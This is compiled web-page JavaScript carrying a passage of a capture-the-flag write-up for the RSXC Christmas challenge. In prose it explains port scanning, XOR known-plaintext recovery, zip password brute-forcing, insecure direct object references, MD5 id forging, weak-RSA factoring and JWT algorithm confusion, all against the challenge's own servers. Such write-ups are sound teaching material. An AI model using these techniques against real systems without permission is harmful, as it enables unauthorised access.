RSXC."),p.forEach(s),J=k(a),F=t(a,"H2",{id:!0});var G3=o(F);d=t(G3,"A",{href:!0});var B3=o(d);z=c(B3,"[DAY 1] The search"),B3.forEach(s),G3.forEach(s),$a=k(a),Qa=t(a,"H3",{id:!0});var $3=o(Qa);je=t($3,"A",{href:!0});var Q3=o(je);Oh=c(Q3,"Challenge"),Q3.forEach(s),$3.forEach(s),ac=k(a),Wa=t(a,"BLOCKQUOTE",{});var fh=o(Wa);La=t(fh,"P",{});var dh=o(La);Fh=c(dh,"Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges "),Wp=t(dh,"CODE",{});var L3=o(Wp);zh=c(L3,"RSXC{flag}"),L3.forEach(s),Ch=c(dh,". If another flag format is used, the challenge text will mention this."),dh.forEach(s),Dh=k(fh),Sp=t(fh,"P",{});var K3=o(Sp);Yh=c(K3,"In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it\u2019s in the range 30 000-31 000."),K3.forEach(s),fh.forEach(s),sc=k(a),Ka=t(a,"H3",{id:!0});var av=o(Ka);Pe=t(av,"A",{href:!0});var sv=o(Pe);Zh=c(sv,"Solution"),sv.forEach(s),av.forEach(s),nc=k(a),He=t(a,"P",{});var nv=o(He);Jh=c(nv,"We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:"),nv.forEach(s),ec=k(a),as=t(a,"PRE",{class:!0});var uy=o(as);uy.forEach(s),tc=k(a),ss=t(a,"P",{});var Bg=o(ss);jh=c(Bg,"The flag is: "),Mp=t(Bg,"CODE",{});var ev=o(Mp);Ph=c(ev,"RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}"),ev.forEach(s),Bg.forEach(s),oc=k(a),ns=t(a,"H2",{id:!0});var tv=o(ns);Ae=t(tv,"A",{href:!0});var ov=o(Ae);Hh=c(ov,"[DAY 2] A magic word"),ov.forEach(s),tv.forEach(s),pc=k(a),es=t(a,"H3",{id:!0});var pv=o(es);Xe=t(pv,"A",{href:!0});var lv=o(Xe);Ah=c(lv,"Challenge"),lv.forEach(s),pv.forEach(s),lc=k(a),Sa=t(a,"BLOCKQUOTE",{});var mh=o(Sa);Ip=t(mh,"P",{});var iv=o(Ip);Xh=c(iv,"We have found a magical port that is listening on port 20002, maybe you can find todays flag there?"),iv.forEach(s),qh=k(mh),Op=t(mh,"P",{});var cv=o(Op);Gh=c(cv,"rsxc.no:20002"),cv.forEach(s),mh.forEach(s),ic=k(a),ts=t(a,"H3",{id:!0});var rv=o(ts);qe=t(rv,"A",{href:!0});var uv=o(qe);Bh=c(uv,"Solution"),uv.forEach(s),rv.forEach(s),cc=k(a),j=t(a,"P",{});var vp=o(j);$h=c(vp,"We know that there is an open port at 20002, connecting to it using the tool "),Fp=t(vp,"CODE",{});var kv=o(Fp);Qh=c(kv,"netcat"),kv.forEach(s),Lh=c(vp,", we see that it takes in an input and outputs "),zp=t(vp,"CODE",{});var hv=o(zp);Kh=c(hv,'"That is not the byte I want!"'),hv.forEach(s),af=c(vp," whenever the user writes in the wrong input."),vp.forEach(s),rc=k(a),os=t(a,"PRE",{class:!0});var ky=o(os);ky.forEach(s),uc=k(a),Ge=t(a,"P",{});var fv=o(Ge);sf=c(fv,"From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:"),fv.forEach(s),kc=k(a),ps=t(a,"PRE",{class:!0});var hy=o(ps);hy.forEach(s),hc=k(a),ls=t(a,"P",{});var $g=o(ls);nf=c($g,"The flag is "),Cp=t($g,"CODE",{});var dv=o(Cp);ef=c(dv,"RSXC{You_found_the_magic_byte_I_wanted_Good_job!}"),dv.forEach(s),$g.forEach(s),fc=k(a),is=t(a,"H2",{id:!0});var mv=o(is);Be=t(mv,"A",{href:!0});var bv=o(Be);tf=c(bv,"[DAY 3] What does this mean?"),bv.forEach(s),mv.forEach(s),dc=k(a),cs=t(a,"H3",{id:!0});var gv=o(cs);$e=t(gv,"A",{href:!0});var vv=o($e);of=c(vv,"Challenge"),vv.forEach(s),gv.forEach(s),mc=k(a),Qe=t(a,"BLOCKQUOTE",{});var _v=o(Qe);Le=t(_v,"P",{});var Qg=o(Le);pf=c(Qg,`When looking for the prizes to this challenge we came across some text we can\u2019t understand, can you help us figure out what it means?
`),K=t(Qg,"A",{href:!0,rel:!0,class:!0,target:!0});var wv=o(K);lf=c(wv,"https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),wv.forEach(s),Qg.forEach(s),_v.forEach(s),bc=k(a),rs=t(a,"H3",{id:!0});var Ev=o(rs);Ke=t(Ev,"A",{href:!0});var Tv=o(Ke);cf=c(Tv,"Solution"),Tv.forEach(s),Ev.forEach(s),gc=k(a),us=t(a,"PRE",{class:!0});var fy=o(us);fy.forEach(s),vc=k(a),ks=t(a,"P",{});var Lg=o(ks);rf=c(Lg,"We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the \u201CMagic\u201D tool does finally give us the flag: "),aa=t(Lg,"A",{href:!0,rel:!0,class:!0,target:!0});var yv=o(aa);uf=c(yv,"https://gchq.github.io/CyberChef/#recipe=From_Base64(\u2018A-Za-z0-9%2B/%3D\u2019,true)From_Base58(\u2018rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz\u2019,false)Bzip2_Decompress(false)From_Base85(\u2018!-u\u2019)From_Morse_Code(\u2018Space\u2019,\u2018Line%20feed\u2019)From_Hex(\u2018Auto\u2019)From_Base32(\u2018A-Z2-7%3D\u2019,false)"),yv.forEach(s),Lg.forEach(s),_c=k(a),Ma=t(a,"P",{});var bh=o(Ma);kf=c(bh,"The flag is "),Dp=t(bh,"CODE",{});var Vv=o(Dp);hf=c(Vv,"RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}"),Vv.forEach(s),ff=c(bh,"."),bh.forEach(s),wc=k(a),hs=t(a,"H2",{id:!0});var xv=o(hs);at=t(xv,"A",{href:!0});var Rv=o(at);df=c(Rv,"[DAY 4] 4 Bytes of XOR"),Rv.forEach(s),xv.forEach(s),Ec=k(a),fs=t(a,"H3",{id:!0});var Uv=o(fs);st=t(Uv,"A",{href:!0});var Nv=o(st);mf=c(Nv,"Challenge"),Nv.forEach(s),Uv.forEach(s),Tc=k(a),nt=t(a,"BLOCKQUOTE",{});var Wv=o(nt);et=t(Wv,"P",{});var Kg=o(et);bf=c(Kg,`The flag of the day can be found by xor\u2019ing our text with 4 bytes.
`),sa=t(Kg,"A",{href:!0,rel:!0,class:!0,target:!0});var Sv=o(sa);gf=c(Sv,"https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),Sv.forEach(s),Kg.forEach(s),Wv.forEach(s),yc=k(a),ds=t(a,"H3",{id:!0});var Mv=o(ds);tt=t(Mv,"A",{href:!0});var Iv=o(tt);vf=c(Iv,"Solution"),Iv.forEach(s),Mv.forEach(s),Vc=k(a),Ia=t(a,"P",{});var gh=o(Ia);_f=c(gh,"We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known "),Yp=t(gh,"CODE",{});var Ov=o(Yp);wf=c(Ov,"RSXC{"),Ov.forEach(s),Ef=c(gh,", we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:"),gh.forEach(s),xc=k(a),ms=t(a,"PRE",{class:!0});var dy=o(ms);dy.forEach(s),Rc=k(a),bs=t(a,"P",{});var a3=o(bs);Tf=c(a3,"The flag is "),Zp=t(a3,"CODE",{});var Fv=o(Zp);yf=c(Fv,"RSXC{Most_would_say_XOR_isn't_that_useful_anymore}"),Fv.forEach(s),a3.forEach(s),Uc=k(a),gs=t(a,"H2",{id:!0});var zv=o(gs);ot=t(zv,"A",{href:!0});var Cv=o(ot);Vf=c(Cv,"[DAY 5] Plain discussion"),Cv.forEach(s),zv.forEach(s),Nc=k(a),vs=t(a,"H3",{id:!0});var Dv=o(vs);pt=t(Dv,"A",{href:!0});var Yv=o(pt);xf=c(Yv,"Challenge"),Yv.forEach(s),Dv.forEach(s),Wc=k(a),lt=t(a,"BLOCKQUOTE",{});var Zv=o(lt);it=t(Zv,"P",{});var s3=o(it);Rf=c(s3,`A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
`),na=t(s3,"A",{href:!0,rel:!0,class:!0,target:!0});var Jv=o(na);Uf=c(Jv,"https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),Jv.forEach(s),s3.forEach(s),Zv.forEach(s),Sc=k(a),_s=t(a,"H3",{id:!0});var jv=o(_s);ct=t(jv,"A",{href:!0});var Pv=o(ct);Nf=c(Pv,"Solution"),Pv.forEach(s),jv.forEach(s),Mc=k(a),rt=t(a,"P",{});var Hv=o(rt);Wf=c(Hv,"We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first."),Hv.forEach(s),Ic=k(a),ws=t(a,"PRE",{class:!0});var my=o(ws);my.forEach(s),Oc=k(a),Oa=t(a,"P",{});var vh=o(Oa);Sf=c(vh,"Following that I stringed for "),Jp=t(vh,"CODE",{});var Av=o(Jp);Mf=c(Av,"flag"),Av.forEach(s),If=c(vh," which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely."),vh.forEach(s),Fc=k(a),Es=t(a,"PRE",{class:!0});var by=o(Es);by.forEach(s),zc=k(a),ut=t(a,"P",{});var Xv=o(ut);Of=c(Xv,"From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:"),Xv.forEach(s),Cc=k(a),Ts=t(a,"PRE",{class:!0});var gy=o(Ts);gy.forEach(s),Dc=k(a),ys=t(a,"P",{});var n3=o(ys);Ff=c(n3,"The flag is "),jp=t(n3,"CODE",{});var qv=o(jp);zf=c(qv,"RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}"),qv.forEach(s),n3.forEach(s),Yc=k(a),Vs=t(a,"H2",{id:!0});var Gv=o(Vs);kt=t(Gv,"A",{href:!0});var Bv=o(kt);Cf=c(Bv,"[DAY 6] The indecipherable cipher"),Bv.forEach(s),Gv.forEach(s),Zc=k(a),xs=t(a,"H3",{id:!0});var $v=o(xs);ht=t($v,"A",{href:!0});var Qv=o(ht);Df=c(Qv,"Challenge"),Qv.forEach(s),$v.forEach(s),Jc=k(a),ft=t(a,"BLOCKQUOTE",{});var Lv=o(ft);dt=t(Lv,"P",{});var e3=o(dt);Yf=c(e3,`We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
`),ea=t(e3,"A",{href:!0,rel:!0,class:!0,target:!0});var Kv=o(ea);Zf=c(Kv,"https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),Kv.forEach(s),e3.forEach(s),Lv.forEach(s),jc=k(a),Rs=t(a,"H3",{id:!0});var a_=o(Rs);mt=t(a_,"A",{href:!0});var s_=o(mt);Jf=c(s_,"Solution"),s_.forEach(s),a_.forEach(s),Pc=k(a),N=t(a,"P",{});var Na=o(N);jf=c(Na,"As this is an old cipher challenge, I could guess that the cipher will for most part be insecure and that there is also a high change that there already exist online decoders out there in the Internet for that specific cipher. Knowing this I began by identifying the cipher using "),ta=t(Na,"A",{href:!0,rel:!0,class:!0,target:!0});var n_=o(ta);Pf=c(n_,"dcode\u2019s cipher identification tool"),n_.forEach(s),Hf=c(Na,". The result from that tool gave me the cipher "),Pp=t(Na,"CODE",{});var e_=o(Pp);Af=c(e_,"vig\xE8nere cipher"),e_.forEach(s),Xf=c(Na," as the highest probability. Following that I used the same site for decoding vigenere ciphertexts and found the flag on key "),Hp=t(Na,"CODE",{});var t_=o(Hp);qf=c(t_,"YMZHG"),t_.forEach(s),Gf=c(Na,`:
`),bt=t(Na,"IMG",{src:!0,alt:!0}),Na.forEach(s),Hc=k(a),Us=t(a,"P",{});var t3=o(Us);Bf=c(t3,"The flag is "),Ap=t(t3,"CODE",{});var o_=o(Ap);$f=c(o_,"RSXC{isthisnotjustafancycaesarcipher}"),o_.forEach(s),t3.forEach(s),Ac=k(a),Ns=t(a,"H2",{id:!0});var p_=o(Ns);gt=t(p_,"A",{href:!0});var l_=o(gt);Qf=c(l_,"[DAY 7] This is quite meta"),l_.forEach(s),p_.forEach(s),Xc=k(a),Ws=t(a,"H3",{id:!0});var i_=o(Ws);vt=t(i_,"A",{href:!0});var c_=o(vt);Lf=c(c_,"Challenge"),c_.forEach(s),i_.forEach(s),qc=k(a),_t=t(a,"BLOCKQUOTE",{});var r_=o(_t);wt=t(r_,"P",{});var o3=o(wt);Kf=c(o3,`We found this picture that seemed to contain the flag, but it seems like it has been cropped, are you able to help us retrieve the flag?
`),oa=t(o3,"A",{href:!0,rel:!0,class:!0,target:!0});var u_=o(oa);ad=c(u_,"https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),u_.forEach(s),o3.forEach(s),r_.forEach(s),Gc=k(a),Ss=t(a,"H3",{id:!0});var k_=o(Ss);Et=t(k_,"A",{href:!0});var h_=o(Et);sd=c(h_,"Solution"),h_.forEach(s),k_.forEach(s),Bc=k(a),Tt=t(a,"P",{});var f_=o(Tt);nd=c(f_,"We are given an image file that seems to have some parts of it missing. I guessed from the title that it has something to do with the metadata of the image. Having this in mind, I began to look at it using exiftools:"),f_.forEach(s),$c=k(a),Ms=t(a,"PRE",{class:!0});var vy=o(Ms);vy.forEach(s),Qc=k(a),pa=t(a,"P",{});var Li=o(pa);ed=c(Li,"Looking at the output, there seems to be some some binary data at the metadata \u201CThumbnail Image\u201D. Using "),la=t(Li,"A",{href:!0,rel:!0,class:!0,target:!0});var d_=o(la);td=c(d_,"dcode\u2019s EXIF Thumbnail Extractor tool"),d_.forEach(s),od=c(Li,` I try to extract the thumbnail image hoping that the saved thumbnail of the image is of the uncropped and full image, thus also finding the whole flag:
`),yt=t(Li,"IMG",{src:!0,alt:!0}),Li.forEach(s),Lc=k(a),Is=t(a,"P",{});var p3=o(Is);pd=c(p3,"The flag is: "),Xp=t(p3,"CODE",{});var m_=o(Xp);ld=c(m_,"RSXC{Sometimes_metadata_hides_stuff}"),m_.forEach(s),p3.forEach(s),Kc=k(a),Os=t(a,"H2",{id:!0});var b_=o(Os);Vt=t(b_,"A",{href:!0});var g_=o(Vt);id=c(g_,"[DAY 8] The reference"),g_.forEach(s),b_.forEach(s),ar=k(a),Fs=t(a,"H3",{id:!0});var v_=o(Fs);xt=t(v_,"A",{href:!0});var __=o(xt);cd=c(__,"Challenge"),__.forEach(s),v_.forEach(s),sr=k(a),Rt=t(a,"BLOCKQUOTE",{});var w_=o(Rt);Ut=t(w_,"P",{});var l3=o(Ut);rd=c(l3,`I just created a new note saving application, there is still some improvements that can be made but I still decided to show it to you!
`),ia=t(l3,"A",{href:!0,rel:!0,class:!0,target:!0});var E_=o(ia);ud=c(E_,"http://rsxc.no:20008"),E_.forEach(s),l3.forEach(s),w_.forEach(s),nr=k(a),zs=t(a,"H3",{id:!0});var T_=o(zs);Nt=t(T_,"A",{href:!0});var y_=o(Nt);kd=c(y_,"Solution"),y_.forEach(s),T_.forEach(s),er=k(a),V=t(a,"P",{});var L=o(V);hd=c(L,"We are given a link to a page with different notes saved. Out of all the notes we see that, Note 2, Note 3 and Note 4 are available for us. Opening any of the note directs us to a php site with the GET request "),qp=t(L,"CODE",{});var V_=o(qp);fd=c(V_,"id"),V_.forEach(s),dd=c(L," of that note number: "),Gp=t(L,"CODE",{});var x_=o(Gp);md=c(x_,"http://rsxc.no:20008/notes.php?id=2"),x_.forEach(s),bd=c(L,". By directly changing the value of "),Bp=t(L,"CODE",{});var R_=o(Bp);gd=c(R_,"id"),R_.forEach(s),vd=c(L," and the url to "),$p=t(L,"CODE",{});var U_=o($p);_d=c(U_,"http://rsxc.no:20008/notes.php?id=0"),U_.forEach(s),wd=c(L," we receive the flag."),L.forEach(s),tr=k(a),Cs=t(a,"P",{});var i3=o(Cs);Ed=c(i3,"The flag is: "),Qp=t(i3,"CODE",{});var N_=o(Qp);Td=c(N_,"RSXC{Remember_to_secure_your_direct_object_references}"),N_.forEach(s),i3.forEach(s),or=k(a),Ds=t(a,"H2",{id:!0});var W_=o(Ds);Wt=t(W_,"A",{href:!0});var S_=o(Wt);yd=c(S_,"[DAY 9] The reference 2"),S_.forEach(s),W_.forEach(s),pr=k(a),Ys=t(a,"H3",{id:!0});var M_=o(Ys);St=t(M_,"A",{href:!0});var I_=o(St);Vd=c(I_,"Challenge"),I_.forEach(s),M_.forEach(s),lr=k(a),Mt=t(a,"BLOCKQUOTE",{});var O_=o(Mt);It=t(O_,"P",{});var c3=o(It);xd=c(c3,`I see that someone managed to read my personal notes yesterday, so I have improved the security! Good luck!
`),ca=t(c3,"A",{href:!0,rel:!0,class:!0,target:!0});var F_=o(ca);Rd=c(F_,"http://rsxc.no:20009"),F_.forEach(s),c3.forEach(s),O_.forEach(s),ir=k(a),Zs=t(a,"H3",{id:!0});var z_=o(Zs);Ot=t(z_,"A",{href:!0});var C_=o(Ot);Ud=c(C_,"Solution"),C_.forEach(s),z_.forEach(s),cr=k(a),C=t(a,"P",{});var De=o(C);Nd=c(De,"Navigating to the site shows something that looks quite similar to the last challenge, but with a more secured referencing as it is encoded in some way. Reading the different notes available to us gave us the keywords and hints of: "),Lp=t(De,"CODE",{});var D_=o(Lp);Wd=c(D_,"RFC 1321"),D_.forEach(s),Sd=c(De," and"),Kp=t(De,"CODE",{});var Y_=o(Kp);Md=c(Y_,"MD5"),Y_.forEach(s),Id=c(De,`, thus hinting to the used algorithm the note ids are encoded/hashed with. To confirm this, I checked the different id from the available notes on crackstation, and it is indeed true:
`),Ft=t(De,"IMG",{src:!0,alt:!0}),De.forEach(s),rr=k(a),zt=t(a,"P",{});var Z_=o(zt);Od=c(Z_,"Knowing the naming convention and the hash algorithm used for the note id, I could easily craft my own for \u201Cnote0\u201D:"),Z_.forEach(s),ur=k(a),Js=t(a,"PRE",{class:!0});var _y=o(Js);_y.forEach(s),kr=k(a),P=t(a,"P",{});var _p=o(P);Fd=c(_p,"Navigating to the note with that id ("),ra=t(_p,"A",{href:!0,rel:!0,class:!0,target:!0});var J_=o(ra);zd=c(J_,"http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),J_.forEach(s),Cd=c(_p,") did however not give us the flag directly, and instead tells us that the note with the flag has the id of the md5 hash of the word "),al=t(_p,"CODE",{});var j_=o(al);Dd=c(j_,"flag"),j_.forEach(s),Yd=c(_p,". Doing the same steps as above and navigating to the note using this new note id gives us the flag:"),_p.forEach(s),hr=k(a),js=t(a,"PRE",{class:!0});var wy=o(js);wy.forEach(s),fr=k(a),Ps=t(a,"P",{});var r3=o(Ps);Zd=c(r3,"The flag is: "),sl=t(r3,"CODE",{});var P_=o(sl);Jd=c(P_,"RSXC{MD5_should_not_be_used_for_security.Especially_not_with_known_plaintext}"),P_.forEach(s),r3.forEach(s),dr=k(a),Hs=t(a,"H2",{id:!0});var H_=o(Hs);Ct=t(H_,"A",{href:!0});var A_=o(Ct);jd=c(A_,"[DAY 10] Lookup"),A_.forEach(s),H_.forEach(s),mr=k(a),As=t(a,"H3",{id:!0});var X_=o(As);Dt=t(X_,"A",{href:!0});var q_=o(Dt);Pd=c(q_,"Challenge"),q_.forEach(s),X_.forEach(s),br=k(a),Yt=t(a,"BLOCKQUOTE",{});var G_=o(Yt);Zt=t(G_,"P",{});var u3=o(Zt);Hd=c(u3,`Sometimes you need to look up to get the answer you need.
`),ua=t(u3,"A",{href:!0,rel:!0,class:!0,target:!0});var B_=o(ua);Ad=c(B_,"http://rsxc.no:20010"),B_.forEach(s),u3.forEach(s),G_.forEach(s),gr=k(a),Xs=t(a,"H3",{id:!0});var $_=o(Xs);Jt=t($_,"A",{href:!0});var Q_=o(Jt);Xd=c(Q_,"Solution"),Q_.forEach(s),$_.forEach(s),vr=k(a),H=t(a,"P",{});var wp=o(H);qd=c(wp,"Navigating to the page we see an input field telling us to \u201Clookup\u201D. After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running "),nl=t(wp,"CODE",{});var L_=o(nl);Gd=c(L_,"dig"),L_.forEach(s),Bd=c(wp,", "),el=t(wp,"CODE",{});var K_=o(el);$d=c(K_,"nslookup"),K_.forEach(s),Qd=c(wp," and so on didn\u2019t give me any useful results. After a while on a lucky guess I curl\u2019ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:"),wp.forEach(s),_r=k(a),qs=t(a,"PRE",{class:!0});var Ey=o(qs);Ey.forEach(s),wr=k(a),Gs=t(a,"P",{});var k3=o(Gs);Ld=c(k3,"The flag is: "),tl=t(k3,"CODE",{});var aw=o(tl);Kd=c(aw,"RSXC{Sometimes_headers_can_tell_you_something_useful}"),aw.forEach(s),k3.forEach(s),Er=k(a),Bs=t(a,"H2",{id:!0});var sw=o(Bs);jt=t(sw,"A",{href:!0});var nw=o(jt);am=c(nw,"[DAY 11] The not so random prime"),nw.forEach(s),sw.forEach(s),Tr=k(a),$s=t(a,"H3",{id:!0});var ew=o($s);Pt=t(ew,"A",{href:!0});var tw=o(Pt);sm=c(tw,"Challenge"),tw.forEach(s),ew.forEach(s),yr=k(a),Ht=t(a,"BLOCKQUOTE",{});var ow=o(Ht);At=t(ow,"P",{});var h3=o(At);nm=c(h3,`We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
`),ka=t(h3,"A",{href:!0,rel:!0,class:!0,target:!0});var pw=o(ka);em=c(pw,"https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),pw.forEach(s),h3.forEach(s),ow.forEach(s),Vr=k(a),Qs=t(a,"H3",{id:!0});var lw=o(Qs);Xt=t(lw,"A",{href:!0});var iw=o(Xt);tm=c(iw,"Solution"),iw.forEach(s),lw.forEach(s),xr=k(a),Fa=t(a,"P",{});var _h=o(Fa);om=c(_h,"We are given a rsa encryption script and it\u2019s output. Observing the code, we can first see that there\u2019s something strange with the prime generation. The problem is that it doesn\u2019t generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: "),ol=t(_h,"CODE",{});var cw=o(ol);pm=c(cw,"q = nextprime(p * p)"),cw.forEach(s),lm=c(_h," (meaning that q is generated with dependent on p)."),_h.forEach(s),Rr=k(a),A=t(a,"P",{});var Ep=o(A);im=c(Ep,"Knowing this, we know that N is approximately "),pl=t(Ep,"CODE",{});var rw=o(pl);cm=c(rw,"p^3"),rw.forEach(s),rm=c(Ep,", and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find "),ll=t(Ep,"CODE",{});var uw=o(ll);um=c(uw,"q"),uw.forEach(s),km=c(Ep," and then decrypt everything. A quick python script can be seen below:"),Ep.forEach(s),Ur=k(a),Ls=t(a,"PRE",{class:!0});var Ty=o(Ls);Ty.forEach(s),Nr=k(a),Ks=t(a,"P",{});var f3=o(Ks);hm=c(f3,"The flag is: "),il=t(f3,"CODE",{});var kw=o(il);fm=c(kw,"RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}"),kw.forEach(s),f3.forEach(s),Wr=k(a),an=t(a,"H2",{id:!0});var hw=o(an);qt=t(hw,"A",{href:!0});var fw=o(qt);dm=c(fw,"[DAY 12] Twelve seconds of encoding"),fw.forEach(s),hw.forEach(s),Sr=k(a),sn=t(a,"H3",{id:!0});var dw=o(sn);Gt=t(dw,"A",{href:!0});var mw=o(Gt);mm=c(mw,"Challenge"),mw.forEach(s),dw.forEach(s),Mr=k(a),Bt=t(a,"BLOCKQUOTE",{});var bw=o(Bt);cl=t(bw,"P",{});var gw=o(cl);bm=c(gw,`For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012`),gw.forEach(s),bw.forEach(s),Ir=k(a),nn=t(a,"H3",{id:!0});var vw=o(nn);$t=t(vw,"A",{href:!0});var _w=o($t);gm=c(_w,"Solution"),_w.forEach(s),vw.forEach(s),Or=k(a),Qt=t(a,"P",{});var ww=o(Qt);vm=c(ww,"We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:"),ww.forEach(s),Fr=k(a),en=t(a,"PRE",{class:!0});var yy=o(en);yy.forEach(s),zr=k(a),tn=t(a,"P",{});var d3=o(tn);_m=c(d3,"The flag is: "),rl=t(d3,"CODE",{});var Ew=o(rl);wm=c(Ew,"RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}"),Ew.forEach(s),d3.forEach(s),Cr=k(a),on=t(a,"H2",{id:!0});var Tw=o(on);Lt=t(Tw,"A",{href:!0});var yw=o(Lt);Em=c(yw,"[DAY 13] New technology is hard"),yw.forEach(s),Tw.forEach(s),Dr=k(a),pn=t(a,"H3",{id:!0});var Vw=o(pn);Kt=t(Vw,"A",{href:!0});var xw=o(Kt);Tm=c(xw,"Challenge"),xw.forEach(s),Vw.forEach(s),Yr=k(a),ao=t(a,"BLOCKQUOTE",{});var Rw=o(ao);so=t(Rw,"P",{});var m3=o(so);ym=c(m3,`When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn\u2019t.
`),ha=t(m3,"A",{href:!0,rel:!0,class:!0,target:!0});var Uw=o(ha);Vm=c(Uw,"http://rsxc.no:20013"),Uw.forEach(s),m3.forEach(s),Rw.forEach(s),Zr=k(a),ln=t(a,"H3",{id:!0});var Nw=o(ln);no=t(Nw,"A",{href:!0});var Ww=o(no);xm=c(Ww,"Solution"),Ww.forEach(s),Nw.forEach(s),Jr=k(a),za=t(a,"P",{});var wh=o(za);Rm=c(wh,"Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file "),ul=t(wh,"CODE",{});var Sw=o(ul);Um=c(Sw,"Todos.js"),Sw.forEach(s),Nm=c(wh,"."),wh.forEach(s),jr=k(a),cn=t(a,"PRE",{class:!0});var Vy=o(cn);Vy.forEach(s),Pr=k(a),eo=t(a,"P",{});var Mw=o(eo);Wm=c(Mw,"Decrypting it gives us the flag:"),Mw.forEach(s),Hr=k(a),rn=t(a,"PRE",{class:!0});var xy=o(rn);xy.forEach(s),Ar=k(a),un=t(a,"P",{});var b3=o(un);Sm=c(b3,"The flag is: "),kl=t(b3,"CODE",{});var Iw=o(kl);Mm=c(Iw,"RSXC{it_might_be_there_even_if_you_don't_include_it!}"),Iw.forEach(s),b3.forEach(s),Xr=k(a),kn=t(a,"H2",{id:!0});var Ow=o(kn);to=t(Ow,"A",{href:!0});var Fw=o(to);Im=c(Fw,"[DAY 14] JWT"),Fw.forEach(s),Ow.forEach(s),qr=k(a),hn=t(a,"H3",{id:!0});var zw=o(hn);oo=t(zw,"A",{href:!0});var Cw=o(oo);Om=c(Cw,"Challenge"),Cw.forEach(s),zw.forEach(s),Gr=k(a),po=t(a,"BLOCKQUOTE",{});var Dw=o(po);lo=t(Dw,"P",{});var g3=o(lo);Fm=c(g3,`Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
`),fa=t(g3,"A",{href:!0,rel:!0,class:!0,target:!0});var Yw=o(fa);zm=c(Yw,"http://rsxc.no:20014"),Yw.forEach(s),g3.forEach(s),Dw.forEach(s),Br=k(a),fn=t(a,"H3",{id:!0});var Zw=o(fn);io=t(Zw,"A",{href:!0});var Jw=o(io);Cm=c(Jw,"Solution"),Jw.forEach(s),Zw.forEach(s),$r=k(a),da=t(a,"P",{});var Ki=o(da);Dm=c(Ki,"Looking at the title of the challenge I can guess that this challenge is about a wrong implementation of JSON Web Tokens, an industry standard RFC 7519 method for representing claims securely between two parties. Following the guides from "),ma=t(Ki,"A",{href:!0,rel:!0,class:!0,target:!0});var jw=o(ma);Ym=c(jw,"hacktricks"),jw.forEach(s),Zm=c(Ki,` of different ways a JWT can be exploited. I begin to test the exploit of changing the algorithm RS256(asymmetric) to HS256(symmetric), since we had public key given to us. If the backend is implemented without checking for a specific algorithm, the back end code will then use the public key to both sign and verify the signature, meaning that we can easily manipulate and sign our own token. This was done using the site jwt.io:
